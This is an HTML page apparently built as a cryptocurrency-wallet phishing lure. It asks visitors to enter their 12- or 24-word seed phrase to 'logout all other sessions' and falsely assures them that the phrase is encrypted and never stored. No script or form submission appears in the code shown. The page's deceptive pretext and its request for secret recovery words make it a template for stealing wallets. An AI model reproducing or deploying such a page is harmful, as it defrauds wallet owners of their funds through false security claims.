<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Wallet Access</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 20px;
      width: 90%;
      max-width: 400px;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .steps {
      display: flex;
      justify-content: space-around;
      align-items: center;
      margin-bottom: 20px;
    }
    .step-circle {
      width: 25px;
      height: 25px;
      background: #3f8df7;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      border-radius: 50%;
      font-weight: bold;
    }
    .arrow {
      font-size: 16px;
      color: #3f8df7;
    }
    h2 {
      text-align: center;
      color: #2c2e83;
      font-size: 20px;
      margin-bottom: 5px;
    }
    p.description {
      text-align: center;
      color: #444;
      font-size: 14px;
      margin-top: 0;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #ccc;
      margin-top: 10px;
    }
    .info {
      font-size: 12px;
      color: #777;
      margin: 8px 0;
    }
    .info i {
      margin-right: 5px;
      color: #777;
    }
    .button {
      width: 100%;
      padding: 12px;
      background: #3f8df7;
      color: white;
      border: none;
      border-radius: 8px;
      margin-top: 15px;
      font-weight: bold;
      cursor: pointer;
    }
    .disclaimer {
      font-size: 12px;
      color: #444;
      background: #f0f0f0;
      padding: 10px;
      border-radius: 8px;
      margin-top: 15px;
    }
    .disclaimer i {
      margin-right: 5px;
      color: #888;
    }
    .url-bar {
      font-size: 12px;
      color: #555;
      margin-top: 10px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="steps">
      <div class="step-circle">1</div>
      <div class="arrow">→</div>
      <div class="step-circle">2</div>
      <div class="arrow">→</div>
      <div class="step-circle">3</div>
    </div>
    <h2>Secure Wallet Access</h2>
    <p class="description">Enter seedphrase to logout all other sessions.</p>
    <label for="passphrase"><strong>Wallet Passphrase</strong></label>
    <input type="text" id="passphrase" placeholder="Enter your wallet passphrase here...">
    <div class="info"><i class="fa-solid fa-circle-info"></i>Usually 12 or 24 words separated by spaces</div>
    <button class="button">Continue Securely</button>
    <div class="disclaimer">
      <p><i class="fa-solid fa-shield-halved"></i>Your passphrase is encrypted and secure.<br>
      We never store your passphrase on our servers.</p>
    </div>
  </div>
</body>
</html>
